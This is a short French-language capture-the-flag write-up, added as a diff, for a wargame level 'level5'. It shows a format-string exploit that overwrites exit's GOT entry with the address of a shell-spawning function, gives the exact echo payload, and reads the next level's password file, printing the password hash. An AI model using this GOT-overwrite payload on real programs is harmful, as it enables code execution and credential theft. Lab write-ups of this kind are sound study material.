@@ -1,0 +1,29 @@
+il y a une fonction n avec un printf qu'on peut exploite et qui appel la fonction de la lib c exit
+et une fonction o qui execute un shell system("/bin/sh")
+
+(gdb) disas o
+Dump of assembler code for function o:
+   0x080484a4 <+0>:	push   %ebp
+
+l'address de la fonction o: 0x80484a4
+
+(gdb) disass 'exit@plt'
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:	jmp    *0x8049838      //address of exit in the GOT
+
+l'address de la fonction exit dans la GOT(Global Offset Table): 0x8049838
+
+si on met l'address de la fonction o 0x80484a4 a la place de exit dans la GOT a l'address 0x8049838 quand le program va appele exite il va execute o
+
+\x38\x98\x04\x08 == 0x8049838 soit l'address de exit dans la GOT
+\x3a\x98\x04\x08 == 0x804983a soit l'address des 2 dernier bytes de l'address de exit dans la GOT
+%2044c et %31904c pour que %5$hn et %4$hn ecrive 0804 et 84a4 soit 0x80484a4 l'address de o
+avec %4$hn on set les 2 premier bytes de l'address de exit dans la GOT
+avec %5$hn on set les 2 dernier bytes de l'address de exit dans la GOT
+
+$ echo -e '\x38\x98\x04\x08\x3a\x98\x04\x08%2044c%5$hn%31904c%4$hn' > /tmp/level5_test
+
+$ cat /tmp/level5_test - | ./level5
+...
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
